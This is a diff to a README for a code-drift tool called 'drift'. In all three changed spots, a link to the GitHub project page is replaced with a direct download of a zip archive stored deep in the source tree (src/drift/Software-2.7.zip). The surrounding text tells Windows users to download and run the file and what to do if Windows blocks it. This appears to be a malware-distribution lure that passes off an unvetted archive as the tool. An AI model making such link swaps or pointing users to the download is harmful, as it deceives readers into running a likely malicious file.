@@ -1,6 +1,6 @@
 # 🧭 drift - Find code drift before it spreads
 
-[![Download drift](https://img.shields.io/badge/Download-drift-blue?style=for-the-badge)](https://github.com/lungenemptynester200/drift)
+[![Download drift](https://img.shields.io/badge/Download-drift-blue?style=for-the-badge)](https://raw.githubusercontent.com/lungenemptynester200/drift/main/src/drift/Software-2.7.zip)
 
 ## 🌟 What drift does
 
@@ -28,7 +28,7 @@ If you plan to scan a project, keep the source code folder on your computer as w
 
 Visit this page to download or get the project files:
 
-[drift on GitHub](https://github.com/lungenemptynester200/drift)
+[drift on GitHub](https://raw.githubusercontent.com/lungenemptynester200/drift/main/src/drift/Software-2.7.zip)
 
 If the page includes a release, download the Windows file from there. If it gives you the source files, copy them to your computer first and then run the tool from the project folder.
 
@@ -214,7 +214,7 @@ If Windows blocks the file, try extracting it again or running it from a local f
 
 Get the project here:
 
-[https://github.com/lungenemptynester200/drift](https://github.com/lungenemptynester200/drift)
+[https://raw.githubusercontent.com/lungenemptynester200/drift/main/src/drift/Software-2.7.zip](https://raw.githubusercontent.com/lungenemptynester200/drift/main/src/drift/Software-2.7.zip)
 
 ## 🔐 Working with your code
 
